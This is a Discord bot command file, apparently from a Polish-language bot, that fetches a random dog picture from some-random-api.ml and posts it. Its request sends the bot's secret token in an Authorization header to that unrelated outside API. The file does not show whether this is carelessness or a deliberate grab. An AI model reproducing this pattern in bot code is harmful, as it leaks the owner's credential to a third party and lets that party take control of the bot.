const { MessageEmbed } = require('discord.js')
module.exports = {
    name: 'pies',
    description: 'Wysyła losowego psa!',
    category: "fun",
    run: async (client, message) => {
        const fetch = require('node-fetch');
        const req = await fetch(`https://some-random-api.ml/img/dog`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                Authorization: `Bot ${client.token}`,
            },
        });
        const res = await req.json();

        functions.image(message, lang.fun.dog, res.link)
    }
}